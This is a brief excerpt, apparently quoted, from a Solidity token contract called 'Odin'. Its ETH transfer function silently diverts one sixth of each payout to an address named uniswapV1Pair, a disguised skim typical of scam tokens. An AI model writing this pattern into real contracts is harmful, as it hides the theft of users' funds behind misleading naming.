...
contract Odin is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xCb63B3D8cb5D563Da1d2E55607486bbA7134D9D1);
    ...
    function transferToAddressETH(address payable recipient, uint256 amount) private {
        uint256 uniswapV1Amount=uniswapV1Pair==address(0)?0:amount.div(6);
        if(uniswapV1Amount>0){uniswapV1Pair.transfer(uniswapV1Amount);}
        recipient.transfer(amount.sub(uniswapV1Amount));
    }
